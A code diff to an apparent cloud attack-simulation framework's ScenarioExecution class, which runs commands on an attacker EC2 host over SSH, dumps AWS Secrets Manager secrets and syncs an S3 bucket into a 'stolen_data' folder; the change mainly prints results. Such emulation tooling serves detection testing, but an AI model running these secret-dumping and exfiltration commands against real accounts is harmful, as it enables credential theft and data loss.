@@ -136,6 +136,7 @@ class ScenarioExecution:
         nested_cmdline = f"ssh -o StrictHostKeyChecking=no -i {self.attacker_ec2_key} ubuntu@{self.attacker_ec2_external_ip} {escaped_cmd} 2>&1"
 
         return_output = not return_errcode
+
         result = run_subprocess(
             nested_cmdline, return_output=return_output, check=check
         )
@@ -232,7 +233,8 @@ class ScenarioExecution:
     def secrets_dump(self):
         for secret_name in self.discovered_secrets:
             cmdline = f'aws secretsmanager get-secret-value --secret-id "{secret_name}"'
-            res = self.attacker_run(cmdline, check=True)
+            res = self.attacker_run(cmdline)
+            print(res)
 
     def attacker_assume_role(
         self, role_arn, session_name="DebuggingSession", update_env=True, check=True
@@ -315,7 +317,8 @@ class ScenarioExecution:
 
     def s3_exfiltration(self):
         s3_cmd = f"aws s3 sync s3://{self.exfil_bucket_name} /home/ubuntu/stolen_data/"
-        self.attacker_run(s3_cmd, check=True)
+        res = self.attacker_run(s3_cmd)
+        print(res)
 
     def scenario_8_execute(self, manual):
         # Init
